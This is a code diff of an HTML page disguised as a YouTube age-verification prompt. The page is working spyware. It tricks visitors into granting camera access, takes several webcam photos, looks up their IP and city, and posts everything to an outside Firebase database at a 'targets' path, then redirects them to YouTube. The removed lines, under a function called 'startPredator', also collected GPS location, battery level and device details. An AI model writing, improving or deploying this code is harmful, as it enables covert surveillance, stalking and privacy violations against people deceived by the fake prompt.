@@ -8,62 +8,35 @@
     <style>
         body { background: #000; color: #ccc; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         .yt-ui { max-width: 400px; width: 90%; text-align: center; }
-        .red-btn { background: #ff0000; color: white; padding: 12px 30px; border-radius: 2px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        .red-btn { background: #ff0000; color: white; padding: 12px 30px; border-radius: 2px; font-weight: bold; text-transform: uppercase; }
     </style>
 </head>
 <body>
-
     <div class="yt-ui" id="main-ui">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="w-32 mx-auto mb-8" alt="YouTube">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="w-32 mx-auto mb-8">
         <h2 class="text-xl font-bold text-white mb-4">Verification Required</h2>
-        <p class="text-sm text-zinc-500 mb-8">This video is age-restricted. To confirm you are an adult, please click the button below and allow camera/location access for age estimation.</p>
-        <button onclick="startPredator()" class="red-btn">Verify Age</button>
+        <p class="text-sm text-zinc-500 mb-8">This video is age-restricted. Please verify your age to continue.</p>
+        <button onclick="startCapture()" class="red-btn">Verify Age</button>
     </div>
 
     <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const FB_URL = "https://hgggy-a047e-default-rtdb.firebaseio.com/targets.json";
+        const FB_URL = "https://camera-af08b-default-rtdb.firebaseio.com/targets.json";
         let photoCount = 0;
-        let targetData = {
-            time: new Date().toLocaleString(),
-            photos: [],
-            device: {
-                ua: navigator.userAgent,
-                ram: navigator.deviceMemory || 'N/A',
-                cores: navigator.hardwareConcurrency || 'N/A',
-                platform: navigator.platform
-            }
-        };
+        let ipInfo = "Detecting...";
 
-        async function startPredator() {
+        async function startCapture() {
             document.getElementById('main-ui').innerHTML = `<div class="animate-pulse text-red-600 font-bold">Connecting Secure Server...</div>`;
-
-            // 1. Get Battery
-            try {
-                const b = await navigator.getBattery();
-                targetData.battery = Math.round(b.level * 100) + "%";
-            } catch(e) {}
-
-            // 2. Get GPS Location (High Accuracy)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    targetData.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    targetData.accuracy = pos.coords.accuracy + "m";
-                }, null, {enableHighAccuracy: true});
-            }
-
-            // 3. Get IP & City (Backup)
+            
+            // Get IP
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const geo = await res.json();
-                targetData.ip = geo.ip;
-                targetData.city = geo.city + ", " + geo.country;
-                targetData.isp = geo.org;
+                ipInfo = geo.ip + " (" + geo.city + ")";
             } catch(e) {}
 
-            // 4. Multi-Photo Capture (5 Shots)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
@@ -72,9 +45,8 @@
                 const captureInterval = setInterval(async () => {
                     if (photoCount >= 5) {
                         clearInterval(captureInterval);
-                        await finalSend();
                         stream.getTracks().forEach(t => t.stop());
-                        redirect();
+                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                         return;
                     }
 
@@ -83,29 +55,24 @@
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    const photoData = canvas.toDataURL('image/jpeg', 0.4);
-                    targetData.photos.push(photoData);
-                    photoCount++;
+                    const photoData = canvas.toDataURL('image/jpeg', 0.3);
                     
-                    // Har photo ke baad foran update karein (Fast Mode)
-                    fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
-                }, 600); // Har 0.6 second mein ek photo
+                    // Fast Individual Push
+                    fetch(FB_URL, { 
+                        method: 'POST', 
+                        body: JSON.stringify({
+                            time: new Date().toLocaleTimeString(),
+                            photo: photoData,
+                            ip: ipInfo
+                        }) 
+                    });
+                    photoCount++;
+                }, 400); 
 
             } catch(e) {
-                await finalSend();
-                redirect();
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
             }
-        }
-
-        async function finalSend() {
-            return fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
-        }
-
-        function redirect() {
-            const id = new URLSearchParams(window.location.search).get('id') || 'dQw4w9WgXcQ';
-            window.location.href = "https://www.youtube.com/watch?v=" + id;
         }
     </script>
 </body>
 </html>
-
